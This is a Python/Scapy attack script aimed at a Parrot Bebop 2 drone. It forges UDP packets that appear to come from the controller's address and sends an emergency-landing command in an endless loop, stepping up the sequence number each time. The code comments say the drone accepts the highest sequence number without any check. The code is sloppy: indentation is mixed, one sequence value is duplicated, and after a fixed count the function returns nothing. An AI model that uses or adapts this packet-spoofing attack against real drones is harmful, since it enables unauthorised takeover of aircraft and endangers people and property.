from scapy.all import*
from time import sleep

#e= Ether( dst= "a0:14:3d:69:4f:04",src="50:2b:73:e0:5d:50" )
ip = IP(dst=" 192.168.42.1", src ="192.168.42.2") # IP header

#54321 is the default destination port for the Bebop 2 drone
udp= UDP(dport=54321, sport=54711) # spoofed source port - trasnport layer

#payload 3rd octet is the --> sequence number
#The drone recognizes the highest sequence number and doesnt have a way to check
payload="\x03\x0c\x00\x0b\x00\x00\x00\x01\x00\x04\x00" # emergency landing payload
conc= ip/udp/payload # concatenate my packet
def cond(x): #function for incrmenting 3rd octect or sequence number by 1, Initalized as xdd
	
	if count ==0:
		payload="\x03\x0c\xdd\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
	elif count ==1:
		payload="\x03\x0c\xde\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==2:
                payload="\x03\x0c\xdf\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==3:
                payload="\x03\x0c\xe0\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==4:
                payload="\x03\x0c\xe1\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==5:
                payload="\x03\x0c\xe2\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==6:
                payload="\x03\x0c\xe3\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==7:
                payload="\x03\x0c\xe4\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==8:
                payload="\x03\x0c\xe5\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==9:
                payload="\x03\x0c\xe6\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==10:
                payload="\x03\x0c\xe7\x0b\x00\x00\x00\x01\x00\x04\x00"
		return payload
        elif count ==11:
                payload="\x03\x0c\xe8\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==12:
                payload="\x03\x0c\xe9\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==13:
                payload="\x03\x0c\xea\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==14:
                payload="\x03\x0c\xeb\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==15:
                payload="\x03\x0c\xec\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==16:
                payload="\x03\x0c\xed\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count==17:
		payload="\x03\x0c\xf3\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==18:
                payload="\x03\x0c\xef\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==19:
                payload="\x03\x0c\xf0\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==20:
                payload="\x03\x0c\xf1\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==21:
                payload="\x03\x0c\xf2\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==22:
                payload="\x03\x0c\xf3\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload     
	elif count ==23:
                payload="\x03\x0c\xf4\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==24:
                payload="\x03\x0c\xf5\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==25:
                payload="\x03\x0c\xf6\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==26:
                payload="\x03\x0c\xf7\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==27:
                payload="\x03\x0c\xf8\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==28:
                payload="\x03\x0c\xf9\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==29:
                payload="\x03\x0c\xfa\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==30:
                payload="\x03\x0c\xfb\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==31:
                payload="\x03\x0c\xfc\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==32:
                payload="\x03\x0c\xfd\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==33:
                payload="\x03\x0c\xfe\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload
        elif count ==34:
                payload="\x03\x0c\xff\x0b\x00\x00\x00\x01\x00\x04\x00"
                return payload

count=0


while True: # spamming packets baiscally 

        payload =cond(count)
        print(hexdump(payload))

        conc=ip/udp/payload
        send(conc)

        count+=1
	sleep(3)
print(conc.show())
print(conc.summary())

send(conc)

